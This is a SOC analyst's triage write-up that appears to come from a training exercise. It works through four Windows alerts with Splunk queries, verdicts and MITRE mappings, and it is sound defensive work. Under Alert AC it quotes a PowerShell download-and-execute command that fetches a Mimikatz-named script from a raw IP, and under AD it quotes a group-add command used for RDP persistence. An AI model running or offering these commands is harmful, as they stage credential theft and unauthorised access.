# Investigation — Case 017 (Phase 3)

## Prioritization Decision (Before Investigation)

**Chosen order: AC → AE → AD → AF**

**Justification:**
- **Alert AC first** — a download-and-execute pattern referencing a named credential-dumping tool represents the most severe, actively-executing threat in the queue.
- **Alert AE second** — an outbound connection from a non-email process on an SMTP-adjacent port could indicate active exfiltration or C2 communication; checked before the lower-priority items.
- **Alert AD third** — a self-service group membership change is a lower-privilege, potentially explainable action; appropriately placed after the two active-execution/communication alerts.
- **Alert AF last** — a system time change alone is not actively harmful, but is checked last rather than dismissed, given its potential connection to anti-forensics activity.

---

## Alert AC — PowerShell Download of Mimikatz-Named Tool

**SPL Query:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*powershell.exe" Process_Command_Line="*mimi*"
| table _time, ComputerName, Account_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```

**Result:** `IEX(New-Object Net.WebClient).DownloadString('http://176.113.115.7/mimi.ps1')`, parent `cmd.exe`.

**Findings:**
- 🔴 Fileless download-and-execute pattern (`IEX + DownloadString`), same technique family as Case_001 and Case_012's Alert K.
- 🔴 External raw IP with no legitimate business justification.
- 🔴 Filename `mimi.ps1` strongly suggests Mimikatz, a well-known credential-dumping tool — combined with the download-execute mechanism, this represents an active attempt to stage credential-theft tooling.

**Verdict: 🔴 TP — T1059.001, T1105 (leading toward T1003 if executed successfully)**

---

## Alert AE — Outbound SMTP-Style Connection via PowerShell

**Given Data (network connection event):**
```
Outbound connection: JIMIL-JOSHI -> 45.32.99.100:2525 (non-standard SMTP port)
Account: hp | Process: powershell.exe
```

**Findings:**
- 🟡 Port 2525 is sometimes used legitimately by cloud email services to avoid ISP restrictions on port 25 — the port alone is not decisive.
- 🔴 **The decisive factor is the source process.** `powershell.exe` — not an email client or mail server process — is making this connection. There is no legitimate reason for a scripting engine to directly initiate SMTP-style traffic. This mirrors the reasoning applied to Case_014's Alert Q: the process making an action is often more diagnostic than the specific port or destination involved.
- 🔴 This pattern is consistent with data exfiltration or C2 communication disguised as mail traffic (T1048.003/T1071).

**Verdict: 🔴 TP — T1071/T1048 (Exfiltration or C2 disguised as mail-protocol traffic)**

---

## Alert AD — Self-Add to "Remote Desktop Users" Group

**SPL Query:**
```spl
index=* sourcetype="WinEventLog:Security" EventCode=4688 New_Process_Name="*net.exe" Process_Command_Line="*Remote Desktop Users*"
| table _time, ComputerName, Account_Name, Process_Command_Line, Creator_Process_Name
| sort -_time
| head 5
```

**Result:** `net localgroup "Remote Desktop Users" hp /add`, parent `cmd.exe`.

**Findings:**
- 🟡 **Key distinction from Case_002:** Case_002 added a separate, unfamiliar account (`hpbackup`) to Administrators — a clear privilege escalation for a different identity with no legitimate explanation. Here, the existing, known user (`hp`) adds themselves to a lower-privilege group (Remote Desktop Users, not Administrators).
- 🟠 **Concerning interpretation:** if `hp`'s account is compromised, self-adding to Remote Desktop Users is a recognized technique for establishing persistent remote access via RDP (T1078).
- 🟢 **Explainable interpretation:** legitimate users commonly enable RDP access to their own machine for remote work purposes; no baseline exists to confirm this is atypical for `hp`.
- 🟡 No corroborating evidence (e.g., a subsequent external RDP connection) was available to break the tie, despite this alert occurring in the same session as two confirmed TP alerts (AC, AE).

**Verdict: 🟡 Ambiguous**

---

## Alert AF — System Time Changed Backward by 2 Hours

**Given Data:**
```
System time changed from 14:30 to 12:30 (2 hours backward)
Account: hp | Event: System clock change
```

**Findings:**
- 🟡 Legitimate explanations exist (NTP sync correction, manual DST adjustment), and no baseline confirms whether this is atypical for this host.
- 🟠 **Session context matters:** this event occurs within the same session/timeframe as two already-confirmed TP alerts (AC — Mimikatz download, AE — SMTP exfiltration). A backward clock change is a documented anti-forensics-adjacent technique (T1070.006-related) used to confuse log timeline analysis and event correlation. Evaluating this alert in complete isolation, without considering the surrounding confirmed-malicious activity, would understate its significance.
- 🟡 No independent confirmation exists that the time change was deliberately malicious versus coincidental/technical (e.g., an NTP correction happening to occur around the same time).

**Verdict: 🟡 Ambiguous — T1070.006-adjacent, correlated with confirmed session activity but not independently confirmed as intentional**

---

## Summary Table

| Alert | Verdict | MITRE | SIEM Label vs. Reality |
|---|---|---|---|
| AC — Mimikatz Download | 🔴 TP | T1059.001, T1105 | High label matched reality |
| AE — SMTP Exfil via PowerShell | 🔴 TP | T1071, T1048 | Medium label underestimated severity given process context |
| AD — Self-Add to RDP Users | 🟡 Ambiguous | T1078 (related) | Medium label matched reality |
| AF — Backward Time Change | 🟡 Ambiguous | T1070.006 (related) | Low label underestimated the correlation concern given surrounding session activity |
